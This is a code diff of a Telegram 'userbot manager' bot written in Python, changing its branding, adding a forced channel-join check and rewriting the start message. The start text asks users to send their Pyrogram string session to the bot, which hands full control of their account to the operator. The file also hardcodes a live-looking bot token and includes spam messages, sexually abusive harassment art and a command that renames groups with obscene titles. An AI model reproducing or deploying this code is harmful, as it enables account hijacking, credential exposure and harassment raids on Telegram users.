@@ -1,5 +1,4 @@
 import asyncio
-import re
 
 # --- ASYNCIO EVENT LOOP FIX FOR PYTHON 3.14+ ---
 try:
@@ -44,6 +43,11 @@ BOT_TOKEN = "8485202414:AAEEYv7_UjUR2DI4KN9l4bEKnsD9v0WGn7E"
 
 OWNER_ID = 7727470646 # ✅ Aapki Owner ID
 
+# ✅ FORCE SUBSCRIBE CONFIG
+FORCE_CHANNEL_ID = -1003892920891  
+FORCE_CHANNEL_LINK = "https://t.me/+Om1HMs2QTHk1N2Zh" 
+FORCE_GROUP = "Anysnapsupport"
+
 # Main Manager Bot
 bot = Client("MagmaManager", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
@@ -62,13 +66,12 @@ waiting_for_ad = {}
 active_ads = {}
 ad_content = {}
 
-# ==================== AAPKA EXACT START MESSAGE LOGIC ====================
-# Bot ka dimaag jisme sab save hoga
+# --- START MESSAGE STORAGE (EXACTLY AS YOU PROVIDED) ---
 START_DATA = {
     "type": "text",      # Ye batayega ki photo hai, video hai ya text
     "file_id": None,     # Media ka unique code
     "text": None,        # Aapka message ya caption
-    "entities": None     # Aapke Premium Emojis
+    "entities": None     # Aapke Premium Emojis/Quotes
 }
 
 # --- SHORT SPAM LIST ---
@@ -80,6 +83,28 @@ SPAM_MESSAGES = [
 ]
 
 # ==================== HELPER FUNCTIONS ====================
+
+async def check_force_subscribe(client, message):
+    user_id = message.from_user.id
+    try:
+        await client.get_chat_member(FORCE_CHANNEL_ID, user_id)
+        await client.get_chat_member(FORCE_GROUP, user_id)
+        return True
+    except UserNotParticipant:
+        buttons = [
+            [InlineKeyboardButton("📢 Join Channel", url=FORCE_CHANNEL_LINK)],
+            [InlineKeyboardButton("👥 Join Group", url=f"https://t.me/{FORCE_GROUP}")],
+        ]
+        await message.reply(
+            "**⛔ ACCESS DENIED!**\n\n"
+            "You must join our Channel and Group to use this bot.\n"
+            "Join then try again!",
+            reply_markup=InlineKeyboardMarkup(buttons)
+        )
+        return False
+    except Exception as e:
+        print(f"FS Error: {e}")
+        return True 
 
 async def smart_edit(message, text, sleep_time=0.5):
     try:
@@ -331,7 +356,7 @@ async def love_handler(client, message):
 async def yourmom_handler(client, message):
     await smart_edit(message, "🤱 **Searching for Mom...**")
     await smart_edit(message, "🫦 **Target Locked!**")
-    header = "🤱 Gourisen OSINT USER'S VS YOUR MOM 💋"
+    header = "🤱 ANYSNAP USER'S VS YOUR MOM 💋"
     footer = "TERI MAA MERI LUND PE 🥵💋"
     await draw_art(message, YOURMOM_ART, header=header, footer=footer)
 
@@ -642,7 +667,7 @@ async def end_cmd(client, message):
         return
 
     try:
-        await client.set_chat_title(chat_id, "FUCK BY Gourisen OSINT USER")
+        await client.set_chat_title(chat_id, "FUCK BY ANYSNAP USER")
     except Exception:
         pass
 
@@ -750,13 +775,13 @@ async def ad_filter_func(_, __, message):
     return bool(waiting_for_ad.get(message.from_user.id, False))
 ad_filter = filters.create(ad_filter_func)
 
-
+# 🟢 START COMMAND CONFIG - EXACTLY AS PROVIDED BY YOU 🟢
 @bot.on_message(filters.command("addstart") & filters.user(OWNER_ID) & filters.private)
 async def save_start_with_media(client, message):
     global START_DATA
     
     if not message.reply_to_message:
-        await message.reply_text("⚠️ Bhai, pehle message (photo/video/text) bhejo, fir us par reply karke /addstart likho!")
+        await message.reply_text("⚠️ Bhai, pehle message (photo/video/text) bhejo, fir us par reply karke `/addstart` likho!")
         return
     
     reply = message.reply_to_message
@@ -791,19 +816,10 @@ async def save_start_with_media(client, message):
 
 @bot.on_message(filters.command("start") & filters.private)
 async def start_cmd(client, message):
+    if not await check_force_subscribe(client, message):
+        return
+
     global START_DATA
-    
-    # Niche ke buttons, ekdum clean aur Gourisen OSINT branding ke sath
-    buttons = InlineKeyboardMarkup(
-        [
-            [InlineKeyboardButton("🎵 Aᴅᴅ Mᴇ Tᴏ Yᴏᴜʀ Gʀᴏᴜᴘ", url=f"https://t.me/{client.me.username}?startgroup=true")],
-            [
-                InlineKeyboardButton("📚 Cᴏᴍᴍᴀɴᴅs", callback_data="commands"),
-                InlineKeyboardButton("⚙️ Sᴇᴛᴛɪɴɢs", callback_data="settings")
-            ],
-            [InlineKeyboardButton("👨‍💻 Gourisen OSINT", url="https://t.me/your_username_here")]
-        ]
-    )
 
     # Ab check karte hain bot ke dimaag mein kya save hai
     try:
@@ -811,34 +827,54 @@ async def start_cmd(client, message):
             await message.reply_photo(
                 photo=START_DATA["file_id"], 
                 caption=START_DATA["text"], 
-                caption_entities=START_DATA["entities"], 
-                reply_markup=buttons
+                caption_entities=START_DATA["entities"]
             )
             
         elif START_DATA["type"] == "video" and START_DATA["file_id"]:
             await message.reply_video(
                 video=START_DATA["file_id"], 
                 caption=START_DATA["text"], 
-                caption_entities=START_DATA["entities"], 
-                reply_markup=buttons
+                caption_entities=START_DATA["entities"]
             )
             
         elif START_DATA["type"] == "text" and START_DATA["text"]:
             await message.reply_text(
                 text=START_DATA["text"], 
-                entities=START_DATA["entities"], 
-                reply_markup=buttons
+                entities=START_DATA["entities"]
             )
             
         else:
-            await message.reply_text("Hᴇʏ! 1 2 3... Sᴛᴀʀᴛ ᴍᴇssᴀɢᴇ sᴇᴛ ᴋᴀʀᴏ ʙʜᴀɪ ✨", reply_markup=buttons)
+            text = """
+🔥 **WELCOME TO MAGMA USERBOT MANAGER** 🔥
+
+**I can help you run the powerful Magma Userbot on your Telegram account.**
+
+✨ **HOW TO START:**
+
+1️⃣ **Get Session:**
+   Go to @Stingxsessionbot and generate a **Pyrogram** String Session.
+
+2️⃣ **Connect:**
+   Send the session here using the add command:
+   `/add <your_string_session>`
+
+3️⃣ **Enjoy:**
+   Once connected, type `.help` in your Saved Messages to see commands!
+
+⚠️ **Note:** Keep your session safe!
+"""
+            await message.reply_text(text)
             
     except Exception as e:
+        print(f"Start Error: {e}")
         await message.reply_text(f"Error aagaya bhai: {e}")
 
 
 @bot.on_message(filters.command("add") & filters.private)
 async def add_session_handler(client, message):
+    if not await check_force_subscribe(client, message):
+        return
+
     if len(message.command) < 2:
         await message.reply("❌ Usage: `/add <StringSession>`")
         return
